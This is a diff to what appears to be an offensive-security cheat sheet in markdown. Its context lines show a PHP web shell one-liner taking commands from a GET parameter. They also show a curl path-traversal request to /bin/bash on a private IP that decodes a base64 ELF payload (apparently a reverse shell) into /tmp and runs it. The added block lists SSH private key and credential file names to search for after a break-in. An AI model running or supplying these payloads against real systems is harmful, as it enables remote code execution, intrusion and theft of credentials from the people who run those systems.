@@ -44,6 +44,21 @@ omgthissofun/<?php passthru($_GET['cmd']); ?>          # this will refeclt in /v
 ```
 curl -s --path-as-is http://192.168.207.188/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash -d 'echo f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAiYAAAA3AAAAAcAAAAAEAAAMdv341NDU2oCieGwZs2Ak1mwP82ASXn5aMCoLapoAgARXInhsGZQUVOzA4nhzYBSaG4vc2hoLy9iaYnjUlOJ4bALzYA= | base64 -d > /tmp/exploit; chmod +x /tmp/exploit; /tmp/exploit'
 ```
+```
+id_rsa
+id_ecdsa
+id_ed25519
+id_dsa
+id_rsa.pub
+id_ecdsa.pub
+id_ed25519.pub
+id_dsa.pub
+*.pem
+*.key
+id_rsa.old
+id_rsa.bak
+authorized_keys
+```
 
 ### PDF to text 
 ```
